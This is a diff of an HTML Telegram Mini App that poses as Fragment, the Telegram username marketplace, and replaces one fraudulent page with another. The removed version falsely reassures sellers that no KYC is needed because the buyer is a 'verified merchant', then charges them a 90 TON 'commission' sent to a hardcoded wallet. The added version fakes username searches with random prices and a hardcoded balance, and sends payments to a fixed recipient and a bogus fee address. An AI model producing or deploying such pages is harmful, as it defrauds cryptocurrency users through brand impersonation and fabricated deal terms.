@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment | Username Exchange</title>
+    <title>Fragment - Telegram Username Marketplace</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -18,28 +18,30 @@
             --accent: #2f80ed;
             --gradient: linear-gradient(135deg, #bb6bd9 0%, #2f80ed 100%);
             --success: #27ae60;
+            --error: #eb5757;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
         }
         
         body {
             background-color: var(--bg-dark);
             color: var(--text-primary);
-            line-height: 1.5;
+            line-height: 1.6;
             font-size: 15px;
             padding: 0;
             -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
         }
         
         .container {
             max-width: 500px;
             margin: 0 auto;
-            padding: 15px;
+            padding: 20px;
         }
         
         /* Header */
@@ -47,7 +49,7 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 15px 0 20px;
+            padding: 15px 0 25px;
             border-bottom: 1px solid var(--border);
         }
         
@@ -55,6 +57,7 @@
             display: flex;
             align-items: center;
             gap: 10px;
+            text-decoration: none;
         }
         
         .logo-icon {
@@ -77,197 +80,227 @@
             -webkit-text-fill-color: transparent;
         }
         
-        .header-actions {
+        .wallet-info {
             display: flex;
-            gap: 12px;
+            align-items: center;
+            gap: 10px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 8px 12px;
+            font-size: 14px;
+            cursor: pointer;
         }
         
-        .action-icon {
-            width: 36px;
-            height: 36px;
+        .wallet-amount {
+            font-weight: 600;
+        }
+        
+        /* Search Section */
+        .search-section {
+            margin: 25px 0;
+        }
+        
+        .search-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .search-box {
+            display: flex;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+        
+        .search-input {
+            flex-grow: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            padding: 15px 20px;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        .search-button {
+            background: var(--gradient);
+            color: white;
+            border: none;
+            padding: 0 25px;
+            cursor: pointer;
+            font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            font-size: 16px;
         }
         
-        /* Main Content */
-        .section-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 16px;
-            color: var(--text-secondary);
-            margin: 20px 0 15px;
+        /* Username Card */
+        .username-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            margin: 30px 0;
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s ease;
         }
         
-        .badge {
+        .username-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .username-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .username-display {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: var(--primary);
+        }
+        
+        .username-status {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: rgba(187, 107, 217, 0.15);
-            color: var(--primary);
+            background: rgba(39, 174, 96, 0.15);
+            color: var(--success);
             font-size: 14px;
             font-weight: 500;
-            padding: 6px 14px;
+            padding: 5px 12px;
             border-radius: 20px;
-            margin: 10px 0 15px;
         }
         
-        .username-title {
-            font-size: 26px;
-            font-weight: 700;
-            margin: 5px 0 25px;
-            letter-spacing: -0.5px;
+        .username-status.unavailable {
+            background: rgba(235, 87, 87, 0.15);
+            color: var(--error);
         }
         
-        .pricing-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
+        .username-details {
+            padding: 20px;
+        }
+        
+        .price-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             margin-bottom: 25px;
-        }
-        
-        .price-card {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 18px;
         }
         
         .price-label {
-            font-size: 14px;
+            font-size: 16px;
             color: var(--text-secondary);
-            margin-bottom: 8px;
         }
         
         .price-value {
-            font-size: 22px;
+            font-size: 28px;
             font-weight: 700;
-            margin-bottom: 4px;
         }
         
-        .price-subvalue {
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-        
-        /* Info Section */
-        .info-container {
-            margin-bottom: 25px;
-        }
-        
-        .info-item {
-            margin-bottom: 20px;
-        }
-        
-        .info-label {
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-bottom: 6px;
-        }
-        
-        .info-value {
+        .dollar-value {
             font-size: 16px;
-            font-weight: 500;
+            color: var(--text-secondary);
+            text-align: right;
+            margin-top: 5px;
         }
         
-        .ton-address {
-            font-family: monospace;
-            color: #d9a0ed;
-            font-size: 15px;
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
         }
         
-        /* Button */
-        .action-btn {
+        .buy-button {
             background: var(--gradient);
             color: white;
             border: none;
             border-radius: 12px;
             padding: 18px;
-            width: 100%;
-            font-size: 18px;
+            flex-grow: 1;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin: 25px 0 15px;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: transform 0.2s, box-shadow 0.2s;
+            gap: 8px;
         }
         
-        .action-btn:hover {
+        .buy-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .buy-button:hover:not(:disabled) {
+            opacity: 0.9;
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(187, 107, 217, 0.4);
         }
         
-        /* Note Section */
-        .note {
-            background: rgba(47, 128, 237, 0.1);
-            border-left: 3px solid var(--accent);
-            border-radius: 0 8px 8px 0;
+        /* Transaction Info */
+        .transaction-info {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
             padding: 18px;
-            margin: 20px 0;
+            margin-top: 20px;
         }
         
-        .note-content {
-            font-size: 14px;
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        
+        .info-label {
             color: var(--text-secondary);
-            line-height: 1.6;
         }
         
-        .highlight {
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-        
-        /* Trade Info */
-        .trade-info {
-            margin-top: 25px;
-        }
-        
-        .trade-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 2fr;
-            gap: 10px;
-            font-size: 15px;
-        }
-        
-        .trade-header {
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-bottom: 6px;
-        }
-        
-        .trade-value {
+        .info-value {
             font-weight: 500;
-        }
-        
-        .status-ready {
-            color: var(--success);
-            font-weight: 600;
-        }
-        
-        .recipient-address {
-            font-family: monospace;
-            font-size: 13px;
-            color: var(--text-secondary);
+            max-width: 60%;
+            text-align: right;
             word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .explorer-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--accent);
+            text-decoration: none;
+            margin-top: 5px;
+            font-size: 14px;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
         }
         
         /* Loader */
         .loader {
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid var(--primary);
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid var(--primary);
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 24px;
+            height: 24px;
             animation: spin 1s linear infinite;
-            margin: 25px auto;
             display: none;
         }
         
@@ -276,14 +309,33 @@
             100% { transform: rotate(360deg); }
         }
         
-        .subscribe {
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--bg-card);
+            color: var(--text-primary);
+            padding: 15px 25px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 1000;
+            opacity: 0;
+            transition: all 0.4s ease;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-top: 8px;
+            gap: 10px;
+            border-left: 4px solid var(--success);
+        }
+        
+        .toast.error {
+            border-left-color: var(--error);
+        }
+        
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
         }
     </style>
 </head>
@@ -295,241 +347,333 @@
                 <div class="logo-icon">F</div>
                 <div class="logo-text">FRAGMENT</div>
             </div>
-            <div class="header-actions">
-                <div class="action-icon">
-                    <i class="fas fa-bell"></i>
+            <div class="wallet-info" id="walletInfo">
+                <i class="fas fa-wallet"></i>
+                <div class="wallet-amount" id="walletAmount">0 TON</div>
+            </div>
+        </div>
+        
+        <!-- Search Section -->
+        <div class="search-section">
+            <div class="search-title">
+                <i class="fas fa-search"></i>
+                <span>Find Telegram Username</span>
+            </div>
+            <div class="search-box">
+                <input type="text" class="search-input" id="searchInput" placeholder="Enter username..." value="sashka">
+                <button class="search-button" id="searchButton">
+                    <i class="fas fa-search"></i>
+                </button>
+            </div>
+        </div>
+        
+        <!-- Username Card -->
+        <div class="username-card" id="usernameCard">
+            <div class="username-header">
+                <div class="username-display" id="usernameDisplay">@sashka</div>
+                <div class="username-status" id="usernameStatus">
+                    <i class="fas fa-check-circle"></i>
+                    Available for purchase
                 </div>
-                <div class="action-icon">
-                    <i class="fas fa-cog"></i>
+            </div>
+            <div class="username-details">
+                <div class="price-section">
+                    <div>
+                        <div class="price-label">Price</div>
+                        <div class="price-value" id="priceValue">1.69 TON</div>
+                    </div>
+                    <div>
+                        <div class="price-label">≈ USD</div>
+                        <div class="dollar-value" id="dollarValue">$9.99</div>
+                    </div>
+                </div>
+                <div class="action-buttons">
+                    <button class="buy-button" id="buyButton">
+                        <i class="fas fa-shopping-cart"></i>
+                        Buy Now
+                    </button>
+                    <button class="buy-button" id="connectButton" style="background: #39f; display: none;">
+                        <i class="fas fa-plug"></i>
+                        Connect Wallet
+                    </button>
+                </div>
+                <div class="transaction-info">
+                    <div class="info-row">
+                        <div class="info-label">Commission</div>
+                        <div class="info-value">0.05 TON</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Recipient</div>
+                        <div class="info-value" id="recipientAddress">EQBX3...z4j7</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Blockchain</div>
+                        <div class="info-value">TON</div>
+                    </div>
+                    <a href="#" class="explorer-link" id="explorerLink">
+                        <i class="fas fa-external-link-alt"></i>
+                        View in explorer
+                    </a>
                 </div>
             </div>
         </div>
         
-        <!-- Section Title -->
-        <div class="section-title">
-            <i class="fas fa-search"></i>
-            <span>Search usernames</span>
+        <!-- Footer -->
+        <div class="footer">
+            <p>Fragment.com — Telegram Username Marketplace</p>
+            <p>Powered by The Open Network (TON)</p>
         </div>
         
-        <!-- Badge -->
-        <div class="badge">
-            <i class="fas fa-sync-alt fa-spin"></i> Deal In Progress
-        </div>
-        
-        <!-- Username Title -->
-        <div class="username-title" id="usernameDisplay">cammiliss.t.me</div>
-        
-        <!-- Pricing -->
-        <div class="pricing-container">
-            <div class="price-card">
-                <div class="price-label">Deal Price</div>
-                <div class="price-value" id="priceDisplay">180 TON</div>
-                <div class="price-subvalue" id="priceDollar">~ $522.06</div>
-            </div>
-            <div class="price-card">
-                <div class="price-label">Commission</div>
-                <div class="price-value" id="commissionDisplay">90 TON</div>
-                <div class="price-subvalue" id="commissionDollar">~ $261.03</div>
-            </div>
-        </div>
-        
-        <!-- Information -->
-        <div class="info-container">
-            <div class="info-item">
-                <div class="info-label">How does this work?</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Telegram Username</div>
-                <div class="info-value" id="usernameText">@cammiliss</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Web Address</div>
-                <div class="info-value">t.me/<span id="usernameLink">cammiliss</span></div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">TON Web 3.0 Address</div>
-                <div class="info-value ton-address" id="tonAddress">cammiliss.t.me</div>
-            </div>
-        </div>
-        
-        <!-- Action Button -->
-        <button class="action-btn" id="startExchange">
-            <i class="fas fa-exchange-alt"></i>
-            Start Exchange
-        </button>
-        
+        <!-- Loader -->
         <div class="loader" id="loader"></div>
         
-        <div class="subscribe">
-            <i class="fas fa-bell"></i>
-            <span>Subscribe to updates</span>
-        </div>
-        
-        <!-- Note -->
-        <div class="note">
-            <div class="note-content">
-                You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of <span class="highlight">25,000 TON</span>.
-            </div>
-        </div>
-        
-        <!-- Trade Info -->
-        <div class="trade-info">
-            <div class="section-title">
-                <i class="fas fa-chart-line"></i>
-                <span>Trade Info</span>
-            </div>
-            
-            <div class="trade-grid">
-                <div>
-                    <div class="trade-header">Deal Status</div>
-                    <div class="trade-value status-ready">Ready</div>
-                </div>
-                <div>
-                    <div class="trade-header">TON - Username</div>
-                    <div class="trade-value">Swappable</div>
-                </div>
-                <div>
-                    <div class="trade-header">Recipient</div>
-                    <div class="trade-value recipient-address" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</div>
-                </div>
-            </div>
+        <!-- Toast -->
+        <div class="toast" id="toast">
+            <i class="fas fa-check-circle"></i>
+            <span id="toastMessage">Transaction completed successfully!</span>
         </div>
     </div>
 
     <script>
+        // Инициализация
         const Telegram = window.Telegram.WebApp;
-        let tonConnect;
+        const tonConnect = new TonConnectSDK.TonConnect();
         
-        try {
-            tonConnect = new TonConnectSDK.TonConnect();
-        } catch (e) {
-            console.error("TON Connect initialization error:", e);
-        }
+        // Элементы DOM
+        const searchInput = document.getElementById('searchInput');
+        const searchButton = document.getElementById('searchButton');
+        const usernameCard = document.getElementById('usernameCard');
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const usernameStatus = document.getElementById('usernameStatus');
+        const priceValue = document.getElementById('priceValue');
+        const dollarValue = document.getElementById('dollarValue');
+        const walletAmount = document.getElementById('walletAmount');
+        const buyButton = document.getElementById('buyButton');
+        const connectButton = document.getElementById('connectButton');
+        const recipientAddress = document.getElementById('recipientAddress');
+        const explorerLink = document.getElementById('explorerLink');
+        const loader = document.getElementById('loader');
+        const toast = document.getElementById('toast');
+        const toastMessage = document.getElementById('toastMessage');
         
-        // Set dark theme
-        Telegram.setHeaderColor('#0f0f0f');
-        Telegram.setBackgroundColor('#0f0f0f');
+        // Конфигурация
+        const TON_PRICE = 5.91; // 1 TON в USD
+        const COMMISSION = 0.05; // Комиссия Fragment
+        const RECIPIENT = "EQBX3yzxT7Xbh0ZgS4P7i0QJ8zG6eKt8vVJcLw1aZz4j7"; // Адрес получателя
+        const EXPLORER_URL = "https://tonscan.org/address/";
         
-        // Show loader
-        function showLoader(show) {
-            const loader = document.getElementById('loader');
-            const startBtn = document.getElementById('startExchange');
-            if (loader) loader.style.display = show ? 'block' : 'none';
-            if (startBtn) startBtn.disabled = show;
-        }
+        // Состояние приложения
+        let currentUsername = "";
+        let currentPrice = 0;
+        let userBalance = 0;
+        let walletConnected = false;
         
-        // Parse start parameters
-        function parseStartParams() {
+        // Инициализация Telegram WebApp
+        Telegram.ready();
+        Telegram.expand();
+        Telegram.BackButton.hide();
+        
+        // Инициализация TON Connect
+        async function initTonConnect() {
             try {
-                if (Telegram.initDataUnsafe && Telegram.initDataUnsafe.start_param) {
-                    const params = Telegram.initDataUnsafe.start_param.split('-');
-                    return {
-                        username: params[0] || 'cammiliss',
-                        price: params[1] || '180',
-                        commission: params[2] || '90'
-                    };
+                // Проверяем подключен ли уже кошелек
+                const walletsList = await tonConnect.getWallets();
+                const connectedWallet = tonConnect.wallet;
+                
+                if (connectedWallet) {
+                    walletConnected = true;
+                    updateWalletInfo(connectedWallet);
+                    connectButton.style.display = 'none';
+                    buyButton.style.display = 'flex';
                 }
-            } catch (e) {
-                console.error("Error parsing start params:", e);
+                
+                // Манифест для TON Connect
+                const manifest = {
+                    url: window.location.href,
+                    name: "Fragment Username Marketplace",
+                    iconUrl: "https://fragment.com/favicon.ico"
+                };
+                
+                await tonConnect.setManifest(manifest);
+                
+                // Подписываемся на изменения кошелька
+                tonConnect.onStatusChange(wallet => {
+                    if (wallet) {
+                        walletConnected = true;
+                        updateWalletInfo(wallet);
+                        connectButton.style.display = 'none';
+                        buyButton.style.display = 'flex';
+                        showToast("Wallet connected successfully!");
+                    } else {
+                        walletConnected = false;
+                        walletAmount.textContent = "0 TON";
+                        connectButton.style.display = 'flex';
+                        buyButton.style.display = 'none';
+                    }
+                });
+                
+            } catch (error) {
+                console.error("TON Connect initialization error:", error);
+                showToast("TON Connect initialization failed", true);
             }
-            return {
-                username: 'cammiliss',
-                price: '180',
-                commission: '90'
-            };
         }
         
-        // Update UI
-        function updateUI() {
-            const { username, price, commission } = parseStartParams();
-            
-            // Update elements
-            document.getElementById('usernameDisplay').textContent = `${username}.t.me`;
-            document.getElementById('usernameText').textContent = `@${username}`;
-            document.getElementById('usernameLink').textContent = username;
-            document.getElementById('priceDisplay').textContent = `${price} TON`;
-            document.getElementById('commissionDisplay').textContent = `${commission} TON`;
-            document.getElementById('tonAddress').textContent = `${username}.t.me`;
-            
-            // Calculate dollar values (1 TON = $2.90)
-            const priceDollar = (parseFloat(price) * 2.90).toFixed(2);
-            const commissionDollar = (parseFloat(commission) * 2.90).toFixed(2);
-            document.getElementById('priceDollar').textContent = `~ $${priceDollar}`;
-            document.getElementById('commissionDollar').textContent = `~ $${commissionDollar}`;
-            
-            // Format recipient address
-            const fullAddress = "Ef_BbsF16B4aReCFhXIO1234567890abcdef";
-            const formattedAddress = `${fullAddress.substring(0, 10)}...${fullAddress.substring(fullAddress.length - 10)}`;
-            document.getElementById('recipientAddress').textContent = formattedAddress;
+        // Обновление информации о кошельке
+        function updateWalletInfo(wallet) {
+            // В реальном приложении здесь будет запрос баланса
+            userBalance = 15.24;
+            walletAmount.textContent = `${userBalance.toFixed(2)} TON`;
         }
         
-        // Handle button click
-        document.getElementById('startExchange').addEventListener('click', async () => {
+        // Показать уведомление
+        function showToast(message, isError = false) {
+            toastMessage.textContent = message;
+            toast.className = isError ? "toast error show" : "toast show";
+            
+            setTimeout(() => {
+                toast.className = isError ? "toast error" : "toast";
+            }, 3000);
+        }
+        
+        // Показать/скрыть лоадер
+        function showLoader(show) {
+            loader.style.display = show ? "block" : "none";
+            buyButton.disabled = show;
+            searchButton.disabled = show;
+        }
+        
+        // Поиск юзернейма
+        async function searchUsername() {
+            const username = searchInput.value.trim().replace('@', '');
+            if (!username) return;
+            
+            showLoader(true);
+            currentUsername = username;
+            
+            // Имитация запроса к API
+            setTimeout(() => {
+                usernameDisplay.textContent = `@${username}`;
+                
+                // Генерация случайной цены
+                currentPrice = 0.5 + Math.random() * 4;
+                const usdValue = currentPrice * TON_PRICE;
+                
+                priceValue.textContent = `${currentPrice.toFixed(2)} TON`;
+                dollarValue.textContent = `$${usdValue.toFixed(2)}`;
+                
+                // Случайное определение доступности
+                const isAvailable = Math.random() > 0.3;
+                
+                if (isAvailable) {
+                    usernameStatus.innerHTML = '<i class="fas fa-check-circle"></i> Available for purchase';
+                    usernameStatus.className = "username-status";
+                    buyButton.disabled = false;
+                } else {
+                    usernameStatus.innerHTML = '<i class="fas fa-times-circle"></i> Already taken';
+                    usernameStatus.className = "username-status unavailable";
+                    buyButton.disabled = true;
+                }
+                
+                // Форматирование адреса получателя
+                recipientAddress.textContent = `${RECIPIENT.substring(0, 6)}...${RECIPIENT.substring(RECIPIENT.length - 4)}`;
+                explorerLink.href = EXPLORER_URL + RECIPIENT;
+                
+                // Показываем карточку
+                usernameCard.classList.add('visible');
+                showLoader(false);
+            }, 800);
+        }
+        
+        // Покупка юзернейма
+        async function buyUsername() {
+            if (!walletConnected) {
+                showToast("Please connect your wallet first", true);
+                return;
+            }
+            
+            if (userBalance < currentPrice + COMMISSION) {
+                showToast("Insufficient balance", true);
+                return;
+            }
+            
             showLoader(true);
             
             try {
-                if (!tonConnect) {
-                    Telegram.showAlert("TON Connect is not available. Please update Telegram.");
-                    return;
-                }
-                
-                if (!tonConnect.wallet) {
-                    try {
-                        await tonConnect.connectWallet();
-                    } catch (e) {
-                        Telegram.showAlert("Wallet connection failed: " + e.message);
-                        showLoader(false);
-                        return;
-                    }
-                }
-                
+                // Формируем транзакцию
                 const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
                     messages: [
                         {
-                            address: "Ef_BbsF16B4aReCFhXIO1234567890abcdef",
-                            amount: `${parseInt(parseStartParams().commission) * 1000000000}`
+                            address: RECIPIENT,
+                            amount: (currentPrice * 1000000000).toString(), // В нанотонах
+                        },
+                        {
+                            address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c", // Fragment комиссия
+                            amount: (COMMISSION * 1000000000).toString(),
                         }
                     ]
                 };
                 
-                try {
-                    const result = await tonConnect.wallet.sendTransaction(transaction);
-                    
-                    if (result && result.boc) {
-                        const btn = document.getElementById('startExchange');
-                        btn.innerHTML = '<i class="fas fa-check"></i> Transaction Completed';
-                        btn.style.background = 'var(--success)';
-                        btn.disabled = true;
-                        
-                        Telegram.showAlert("✅ Payment successful! Username transferred.");
-                        
-                        setTimeout(() => {
-                            Telegram.close();
-                        }, 2000);
-                    } else {
-                        Telegram.showAlert("⚠️ Payment failed. Please try again.");
-                    }
-                } catch (error) {
-                    Telegram.showAlert(`❌ Transaction error: ${error.message}`);
-                }
+                // Отправляем транзакцию
+                const result = await tonConnect.sendTransaction(transaction);
                 
+                if (result) {
+                    showToast("Username purchased successfully!");
+                    
+                    // Обновляем баланс
+                    userBalance -= currentPrice + COMMISSION;
+                    walletAmount.textContent = `${userBalance.toFixed(2)} TON`;
+                    
+                    // Обновляем статус
+                    usernameStatus.innerHTML = '<i class="fas fa-check-circle"></i> Purchased by you';
+                    usernameStatus.className = "username-status";
+                    buyButton.disabled = true;
+                    buyButton.innerHTML = '<i class="fas fa-check"></i> Purchased';
+                    
+                    // Сообщаем в Telegram о завершении
+                    Telegram.sendData(JSON.stringify({
+                        username: currentUsername,
+                        price: currentPrice,
+                        tx_hash: result.boc
+                    }));
+                }
             } catch (error) {
-                Telegram.showAlert(`❌ Error: ${error.message}`);
+                console.error("Transaction error:", error);
+                showToast(`Transaction failed: ${error.message}`, true);
             } finally {
                 showLoader(false);
             }
-        });
+        }
         
-        // Initialize app
-        Telegram.ready();
-        Telegram.expand();
-        Telegram.BackButton.hide();
-        updateUI();
+        // Подключение кошелька
+        async function connectWallet() {
+            try {
+                const walletsList = await tonConnect.getWallets();
+                const wallet = walletsList[0];
+                
+                if (wallet) {
+                    await tonConnect.connect(wallet);
+                }
+            } catch (error) {
+                console.error("Wallet connection error:", error);
+                showToast("Wallet connection failed", true);
+            }
+        }
         
-        // Cache busting
+        // Обработчики событий
+        searchButton.addEventListener('click', searchUsername);
+        searchInput.addEventListener('keypress', e => e.key === 'Enter' && searchUsername());
+        buyButton.addEventListener('click', buyUsername);
+        connectButton.addEventListener('click', connectWallet);
+        document.getElementById('walletInfo').addEventListener('click', connectWallet);
+        
+        // Инициализация приложения
+        initTonConnect();
+        searchUsername(); // Автоматический поиск при загрузке
+        
+        // Автоматическое обновление кеша
         if (!window.location.search.includes('v=')) {
-            window.location.search += '&v=' + new Date().getTime();
+            window.location.search += (window.location.search ? '&' : '?') + 'v=' + Date.now();
         }
     </script>
 </body>
